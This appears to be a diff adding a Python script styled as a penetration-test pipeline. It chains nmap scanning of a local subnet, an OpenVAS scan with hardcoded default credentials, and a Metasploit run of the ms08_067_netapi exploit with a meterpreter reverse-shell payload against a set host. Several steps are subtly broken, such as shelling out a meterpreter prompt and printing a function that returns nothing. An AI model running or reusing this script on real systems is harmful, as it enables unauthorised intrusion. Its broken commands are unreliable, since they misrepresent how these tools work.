@@ -1,0 +1,84 @@
+###PLANNING AND RECONNAISSANCE
+import subprocess
+
+# Gather information about target network using Nmap
+def gather_info(target):
+    command = f"nmap -sP {target}"
+    process = subprocess.run(command, shell=True, capture_output=True, text=True)
+    return process.stdout
+
+target_network = "192.168.1.0/24"
+info = gather_info(target_network)
+print(info)
+
+###SCANNING
+import subprocess
+
+# Scan network for open ports and services using Nmap
+def scan_network(target):
+    command = f"nmap -sS -sV {target}"
+    process = subprocess.run(command, shell=True, capture_output=True, text=True)
+    return process.stdout
+
+scan_results = scan_network(target_network)
+print(scan_results)
+
+###VULNERABILITY DETECTION
+# Detect vulnerabilities using OpenVAS (example configuration)
+import os
+
+def detect_vulnerabilities(target):
+    os.system(f"openvas -u admin -w password -p 9390 -q scan_start {target}")
+
+vulnerabilities = detect_vulnerabilities(target_network)
+print(vulnerabilities)
+
+###EXPLOITATION
+import subprocess
+
+# Exploit vulnerabilities using Metasploit (example configuration)
+def exploit_vulnerability(target, exploit, payload):
+    command = f"msfconsole -q -x 'use {exploit}; set RHOST {target}; set PAYLOAD {payload}; run'"
+    process = subprocess.run(command, shell=True, capture_output=True, text=True)
+    return process.stdout
+
+target_host = "192.168.1.10"
+exploit = "exploit/windows/smb/ms08_067_netapi"
+payload = "windows/meterpreter/reverse_tcp"
+exploit_result = exploit_vulnerability(target_host, exploit, payload)
+print(exploit_result)
+
+###POST-EXPLOITATION
+# Assess impact and determine further actions
+def post_exploitation_analysis(session):
+    # Example command to list files
+    command = f"meterpreter> ls"
+    process = subprocess.run(command, shell=True, capture_output=True, text=True)
+    return process.stdout
+
+analysis_result = post_exploitation_analysis("meterpreter_session_id")
+print(analysis_result)
+
+###REPORTING
+# Generate detailed report
+def generate_report(vulns, exploits, analysis):
+    report = f"""
+    Vulnerabilities Found:
+    {vulns}
+    
+    Exploitation Results:
+    {exploits}
+    
+    Post-Exploitation Analysis:
+    {analysis}
+    
+    Recommendations:
+    - Apply patches for identified vulnerabilities
+    - Improve authentication mechanisms
+    - Regularly update software and systems
+    """
+    with open("penetration_test_report.txt", "w") as file:
+        file.write(report)
+
+generate_report("vulnerabilities_data", "exploitation_data", "analysis_data")
+print("Report generated successfully.")
